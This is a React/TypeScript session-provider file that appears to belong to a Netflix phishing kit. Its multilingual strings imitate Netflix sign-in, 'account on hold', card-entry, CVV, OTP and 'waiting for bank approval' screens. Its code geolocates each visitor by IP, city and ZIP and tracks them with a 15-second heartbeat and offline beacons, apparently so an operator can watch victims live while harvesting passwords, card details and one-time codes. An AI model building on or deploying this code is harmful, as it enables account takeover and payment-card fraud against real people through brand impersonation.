'use client';

import { createContext, useContext, useEffect, useState, useRef, ReactNode } from "react";
import { trpc } from "@/lib/trpc";

// ─── Translation dictionary ────────────────────────────────────────────────────
const translations: Record<string, Record<string, string>> = {
  en: {
    securityCheck: "Security Check",
    enterCode: "Enter the 4-digit code shown below to continue.",
    getNewCode: "Get a new code",
    verify: "Verify",
    incorrectCode: "Incorrect code. Please try again.",
    enterAllDigits: "Please enter all 4 digits.",
    signIn: "Sign In",
    emailOrPhone: "Email or mobile number",
    password: "Password",
    useSignInCode: "Use a Sign-In Code",
    forgotPassword: "Forgot password?",
    rememberMe: "Remember me",
    newToNetflix: "New to Netflix?",
    signUpNow: "Sign up now.",
    enterPaymentDetails: "Enter payment details",
    cardNumber: "Card number",
    expirationDate: "Expiration date",
    cvv: "CVV",
    nameOnCard: "Name on card",
    makePayment: "Make Payment",
    accountOnHold: "Your account is on hold.",
    updatePaymentInfo: "Update your payment info to keep enjoying Netflix.",
    changePaymentMethod: "Change payment method",
    iAgree: "I agree.",
    termsText: "By checking the checkbox below, you agree that Netflix will automatically continue your membership and charge the membership fee (currently USD 9.99/month) to your payment method until you cancel.",
    recaptchaNotice: "This page is protected by Google reCAPTCHA to ensure you're not a bot.",
    learnMore: "Learn more.",
    questions: "Questions?",
    contactUs: "Contact us.",
    approveTransaction: "Approve Transaction",
    waitingApproval: "Waiting for bank approval...",
    enterOtp: "Enter OTP",
    otpSentTo: "A verification code has been sent to your registered mobile number.",
    otpCode: "OTP Code",
    submitOtp: "Submit",
    invalidOtp: "Invalid OTP. Please try again.",
    paymentDeclined: "Payment Declined",
    declinedMessage: "Your payment was declined. Please check your card details and try again.",
    tryAgain: "Try Again",
    signOut: "Sign Out",
    processing: "Processing...",
    verifying: "Verifying...",
  },
  fr: {
    securityCheck: "Vérification de sécurité",
    enterCode: "Entrez le code à 4 chiffres affiché ci-dessous pour continuer.",
    getNewCode: "Obtenir un nouveau code",
    verify: "Vérifier",
    incorrectCode: "Code incorrect. Veuillez réessayer.",
    enterAllDigits: "Veuillez entrer les 4 chiffres.",
    signIn: "Se connecter",
    emailOrPhone: "Email ou numéro de téléphone",
    password: "Mot de passe",
    useSignInCode: "Utiliser un code de connexion",
    forgotPassword: "Mot de passe oublié?",
    rememberMe: "Se souvenir de moi",
    newToNetflix: "Nouveau sur Netflix?",
    signUpNow: "Inscrivez-vous maintenant.",
    enterPaymentDetails: "Entrez les détails de paiement",
    cardNumber: "Numéro de carte",
    expirationDate: "Date d'expiration",
    cvv: "CVV",
    nameOnCard: "Nom sur la carte",
    makePayment: "Effectuer le paiement",
    accountOnHold: "Votre compte est suspendu.",
    updatePaymentInfo: "Mettez à jour vos informations de paiement pour continuer à profiter de Netflix.",
    changePaymentMethod: "Changer de méthode de paiement",
    iAgree: "J'accepte.",
    termsText: "En cochant la case ci-dessous, vous acceptez que Netflix continue automatiquement votre abonnement et facture les frais d'abonnement (actuellement 9,99 USD/mois) à votre méthode de paiement jusqu'à ce que vous annuliez.",
    recaptchaNotice: "Cette page est protégée par Google reCAPTCHA pour s'assurer que vous n'êtes pas un robot.",
    learnMore: "En savoir plus.",
    questions: "Questions?",
    contactUs: "Contactez-nous.",
    approveTransaction: "Approuver la transaction",
    waitingApproval: "En attente d'approbation bancaire...",
    enterOtp: "Entrer le code OTP",
    otpSentTo: "Un code de vérification a été envoyé à votre numéro de téléphone enregistré.",
    otpCode: "Code OTP",
    submitOtp: "Soumettre",
    invalidOtp: "OTP invalide. Veuillez réessayer.",
    paymentDeclined: "Paiement refusé",
    declinedMessage: "Votre paiement a été refusé. Veuillez vérifier les détails de votre carte et réessayer.",
    tryAgain: "Réessayer",
    signOut: "Se déconnecter",
    processing: "Traitement...",
    verifying: "Vérification...",
  },
  es: {
    securityCheck: "Verificación de seguridad",
    enterCode: "Ingresa el código de 4 dígitos que se muestra a continuación para continuar.",
    getNewCode: "Obtener un nuevo código",
    verify: "Verificar",
    incorrectCode: "Código incorrecto. Por favor, inténtalo de nuevo.",
    enterAllDigits: "Por favor, ingresa los 4 dígitos.",
    signIn: "Iniciar sesión",
    emailOrPhone: "Correo electrónico o número de teléfono",
    password: "Contraseña",
    useSignInCode: "Usar un código de inicio de sesión",
    forgotPassword: "¿Olvidaste tu contraseña?",
    rememberMe: "Recuérdame",
    newToNetflix: "¿Nuevo en Netflix?",
    signUpNow: "Regístrate ahora.",
    enterPaymentDetails: "Ingresa los detalles de pago",
    cardNumber: "Número de tarjeta",
    expirationDate: "Fecha de vencimiento",
    cvv: "CVV",
    nameOnCard: "Nombre en la tarjeta",
    makePayment: "Realizar pago",
    accountOnHold: "Tu cuenta está en espera.",
    updatePaymentInfo: "Actualiza tu información de pago para seguir disfrutando de Netflix.",
    changePaymentMethod: "Cambiar método de pago",
    iAgree: "Acepto.",
    termsText: "Al marcar la casilla de verificación a continuación, aceptas que Netflix continuará automáticamente tu membresía y cobrará la tarifa de membresía.",
    recaptchaNotice: "Esta página está protegida por Google reCAPTCHA para garantizar que no eres un robot.",
    learnMore: "Más información.",
    questions: "¿Preguntas?",
    contactUs: "Contáctanos.",
    approveTransaction: "Aprobar transacción",
    waitingApproval: "Esperando aprobación del banco...",
    enterOtp: "Ingresar OTP",
    otpSentTo: "Se ha enviado un código de verificación a tu número de teléfono registrado.",
    otpCode: "Código OTP",
    submitOtp: "Enviar",
    invalidOtp: "OTP inválido. Por favor, inténtalo de nuevo.",
    paymentDeclined: "Pago rechazado",
    declinedMessage: "Tu pago fue rechazado. Por favor, verifica los detalles de tu tarjeta e inténtalo de nuevo.",
    tryAgain: "Intentar de nuevo",
    signOut: "Cerrar sesión",
    processing: "Procesando...",
    verifying: "Verificando...",
  },
};

// Map country codes to language codes
const countryToLang: Record<string, string> = {
  FR: "fr", BE: "fr", CH: "fr", CA: "fr", LU: "fr",
  ES: "es", MX: "es", AR: "es", CO: "es", PE: "es", VE: "es", CL: "es", EC: "es",
};

// ─── Context ──────────────────────────────────────────────────────────────────
interface SessionContextType {
  sessionId: string | null;
  geoData: { ip: string; country: string; countryCode: string; city: string; zip: string } | null;
  lang: string;
  t: (key: string) => string;
  isRTL: boolean;
}

const SessionContext = createContext<SessionContextType>({
  sessionId: null,
  geoData: null,
  lang: "en",
  t: (k) => k,
  isRTL: false,
});

export function SessionProvider({ children }: { children: ReactNode }) {
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [geoData, setGeoData] = useState<SessionContextType["geoData"]>(null);
  const [lang, setLang] = useState("en");
  const [mounted, setMounted] = useState(false);
  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const geoQuery = trpc.geo.detect.useQuery(undefined, { retry: false });
  const initMutation = trpc.session.init.useMutation();
  const heartbeatMutation = trpc.session.heartbeat.useMutation();
  const offlineMutation = trpc.session.offline.useMutation();

  // Load session ID from localStorage on mount
  useEffect(() => {
    setMounted(true);
    try {
      const stored = localStorage.getItem("nf_session_id");
      if (stored) setSessionId(stored);
    } catch {}
  }, []);

  // Initialize session and detect geo
  useEffect(() => {
    if (!mounted || !geoQuery.data) return;

    setGeoData(geoQuery.data);
    const detectedLang = countryToLang[geoQuery.data.countryCode] || "en";
    setLang(detectedLang);

    const device = /Mobi|Android/i.test(navigator.userAgent) ? "mobile" : "desktop";
    initMutation.mutate({
      ip: geoQuery.data.ip,
      country: geoQuery.data.country,
      city: geoQuery.data.city,
      zip: geoQuery.data.zip,
      countryCode: geoQuery.data.countryCode,
      userAgent: navigator.userAgent,
      device,
      sessionId: sessionId || undefined,
    }, {
      onSuccess: (data) => {
        setSessionId(data.sessionId);
        try {
          localStorage.setItem("nf_session_id", data.sessionId);
        } catch {}
      },
    });
  }, [geoQuery.data, mounted]);

  // Heartbeat every 15 seconds
  useEffect(() => {
    if (!sessionId || !mounted) return;

    heartbeatRef.current = setInterval(() => {
      heartbeatMutation.mutate({ sessionId });
    }, 15000);

    const markOffline = () => {
      const body = JSON.stringify({ sessionId });
      try {
        navigator.sendBeacon("/api/session-offline", new Blob([body], { type: "application/json" }));
      } catch {
        offlineMutation.mutate({ sessionId });
      }
      try {
        localStorage.removeItem("nf_session_id");
      } catch {}
    };

    const handleUnload = () => markOffline();
    const handleVisibility = () => {
      if (document.visibilityState === "hidden") {
        markOffline();
      } else {
        setSessionId(null);
        try {
          localStorage.removeItem("nf_session_id");
        } catch {}
      }
    };

    window.addEventListener("beforeunload", handleUnload);
    document.addEventListener("visibilitychange", handleVisibility);

    return () => {
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      window.removeEventListener("beforeunload", handleUnload);
      document.removeEventListener("visibilitychange", handleVisibility);
    };
  }, [sessionId, mounted]);

  const t = (key: string): string => {
    return translations[lang]?.[key] || translations["en"]?.[key] || key;
  };

  const isRTL = lang === "ar";

  return (
    <SessionContext.Provider value={{ sessionId, geoData, lang, t, isRTL }}>
      <div dir={isRTL ? "rtl" : "ltr"}>
        {children}
      </div>
    </SessionContext.Provider>
  );
}

export function useSession() {
  return useContext(SessionContext);
}
